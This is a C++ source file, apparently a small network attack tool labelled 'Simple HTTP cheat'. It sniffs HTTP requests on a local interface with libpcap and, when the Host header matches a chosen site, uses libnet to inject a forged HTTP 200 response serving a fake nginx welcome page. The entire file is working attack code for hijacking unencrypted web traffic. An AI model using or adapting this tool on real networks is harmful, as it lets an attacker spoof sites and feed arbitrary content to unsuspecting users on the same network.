/* Simple HTTP cheat
 * To compile: make
 * Run as root!
 * */
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <iostream>
#include <algorithm>
#include <string>

#include "snf.h"
#include "ptl.h"

using std::cout;
using std::endl;
using std::string;

using namespace ptl;

#define MAXBYTES2CAPTURE 2048

const char *http_body_data = 
	"<!DOCTYPE html>\r\n"
	"<html>\r\n"
	"<head>\r\n"
	"<title>this is an fake page!</title>\r\n"
	"<style>\r\n"
	"    body {\r\n"
	"        width: 35em;\r\n"
	"        margin: 0 auto;\r\n"
	"        font-family: Tahoma, Verdana, Arial, sans-serif;\r\n"
	"    }\r\n"
	"</style>\r\n"
	"</head>\r\n"
	"<body>\r\n"
	"<h1>Welcome to fake page!</h1>\r\n"
	"<p>If you see this page, the nginx web server is successfully installed and\r\n"
	"working. Further configuration is required.</p>\r\n"
	"\r\n"
	"<p>For online documentation and support please refer to\r\n"
	"<a href=\"http://nginx.org/\">nginx.org</a>.<br/>\r\n"
	"Commercial support is available at\r\n"
	"<a href=\"http://nginx.com/\">nginx.com</a>.</p>\r\n"
	"\r\n"
	"<p><em>Thank you for using nginx.</em></p>\r\n"
	"</body>\r\n"
	"</html>\r\n"
	"\r\n";

int main(int argc, char *argv[])
{
	int i=0;
	bpf_u_int32 netaddr=0, mask=0;
	struct bpf_program filter;
	pcap_t *descr = NULL;
	struct pcap_pkthdr pkthdr;
	const unsigned char *packet = NULL;
	Ether_header *eptr = NULL;  /* net/ethernet.h */
	Ipv4_header *ipptr = NULL;
	Tcp_header *tcpptr = NULL;
	Httpreq_header httpreq_hdr;
	libnet_t *l = NULL;

//    int injection_type = LIBNET_LINK;   // or LIBNET_RAW4
    int injection_type = LIBNET_RAW4;   // or LIBNET_RAW4
	const char *host = "www.cplusplus.com";

	if (argc < 2){
		printf("Usage: ipsniffer <interface> [host]\n");
		exit(1);
	}

	if (argc >= 3) {
		host = argv[2];
	}

	cout << "host: " << host << endl;

	// libnet dev open
	l = Libnet_init(
            injection_type,                         /* injection type */
            argv[1]);                               /* network interface */

	// libpcap dev open
	descr = Pcap_open_live(argv[1], MAXBYTES2CAPTURE, 1, 0);
	Pcap_lookupnet(argv[1], &netaddr, &mask);
	Pcap_compile(descr, &filter, "tcp and dst port 80", 1, mask);
	Pcap_setfilter(descr, &filter);

	// build http 200 resp
	string http_200_ok = Http_builder::build_200_ok(http_body_data);

	while (1){
		packet = Pcap_next(descr, &pkthdr);
		if (packet == NULL) {
            printf("\n loop was broken out of with pcap_breakloop!\n");
            exit(1);
        }

		eptr = (Ether_header *) packet;
        assert(ntohs(eptr->ether_type) == ETHERTYPE_IP);

		ipptr = (Ipv4_header *) (packet + sizeof (*eptr));
        assert(ipptr->ip_p == IPPROTO_TCP);

		tcpptr = (Tcp_header *) (packet + sizeof (*eptr) + ipptr->ip_hl*4);

		if (!httpreq_parse((uint8_t *) packet + sizeof (*eptr) + ipptr->ip_hl*4 + tcpptr->th_off*4, 
				(uint8_t *) packet + pkthdr.caplen, &httpreq_hdr)) {
			continue;
		}

		cout << "HTTP host: " << httpreq_hdr.host << '\n';
		if (httpreq_hdr.host == host) {
			cout << "match host: " << host << endl;
            Send_tcp_resp(http_200_ok.c_str(), http_200_ok.size(),
                    tcpptr, ipptr, ((injection_type == LIBNET_RAW4) ? NULL : eptr), l);
		}
	}

	return 0;
}

